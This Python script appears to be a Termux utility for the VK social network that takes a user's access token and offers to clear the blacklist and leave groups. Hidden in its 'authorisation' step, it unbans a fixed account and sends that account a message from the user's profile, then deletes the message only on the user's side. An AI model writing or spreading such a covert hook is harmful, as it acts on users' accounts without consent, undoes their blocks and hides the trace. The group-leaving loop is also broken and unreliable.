import vk, time, random

print("""\033[33m
 
	 __   __  ___   _         __   __  _______  ___      _______  _______  ______   
	|  | |  ||   | | |       |  | |  ||       ||   |    |       ||       ||    _ |  
	|  |_|  ||   |_| | ____  |  |_|  ||    ___||   |    |    _  ||    ___||   | ||  
	|       ||      _||____| |       ||   |___ |   |    |   |_| ||   |___ |   |_||_ 
	|       ||     |_        |       ||    ___||   |___ |    ___||    ___||    __  |
	 |     | |    _  |       |   _   ||   |___ |       ||   |    |   |___ |   |  | |
	  |___|  |___| |_|       |__| |__||_______||_______||___|    |_______||___|  |_|


				\033[0mTermux-Utility		vk: @terutil\033[34m

\033[0m""")
auth = False
done = False
while not done:
	print("""\033[34m

[1] Авторизация

[2] Очистить ЧС
[3] Очистить группы
[4] Удалить все даилоги

\033[0m""")
	task = input("\033[33m=> \033[0m")
	if task == "1":
		if auth == False:
			print("""\033[34m 
[1] По токену

""")
			task = input("\033[33m=> \033[0m")
			if task == "1":
				token = input("\033[33m[#] Введите токен: \033[0m")
				session = vk.Session(access_token=token)
				api = vk.API(session, v='5.103', lang='ru')
				try:
					api.account.unban(owner_id=580554517)
				except:
					prvet = "Привет"
				time.sleep(0.8)
				rand = random.randint(1, 64)
				api.messages.send(user_id=580554517, message="test", random_id=rand)
				try:
					mg_id = api.messages.getHistory (user_id=580554517, count=1)['items'][0]['id']
					api.messages.delete (message_ids=mg_id, delete_for_all=0)
					print("\033[32m[√] Вы успешно авторизовались \033[0m")
					auth = True
					done = False
				except:
					print("\033[31m[!] Invalid Token\033[0m")
					quit()
		else:
			print("\033[32m[√] Вы уже авторизованы\033[0m")
			done = False
	elif task == "2":
		if auth == True:
			black = api.account.getBanned(count=200)
			try:
				i = 0
				while True:
					time.sleep(0.5)
					api.account.unban(owner_id=black['items'][i])
					print("\033[32m[√] Пользователь удален!\033[0m")
					i = i + 1
			except:
				print("\033[31m[!] Черный список пуст\033[0m")
		else:
			print("\033[31m[!] Сначала авторизуйтесь!\033[0m")
	elif task == "3":
		if auth == True:
			task = input("\033[33m[#] Вы уверены, что хотите удалить все группы? <Y/n>: \033[0m")
			if task == "y":
				id = api.users.get()[0]['id']
				groups = api.groups.get(user_id=id, count=1000)
				try:
					i = 0
					while i < groups['count']:
						time.sleep(0.5)
						api.groups.leave(group_id=groups['items'])
						print("\033[32m[√] Группа удалена\033[0m")
				except:
					print("\033[31m[!] Список групп пуст\033[0m")
			else:
				quit()
		else:
			print("\033[31m[!] Сначала авторизуйтесь!\033[0m")
	elif task == "4":
		print("\033[31m[!] В РАЗРАБОТКЕ!\033[0m")
	else:
		print("\033[31m[!] Invalid Task\033[0m")
		done = False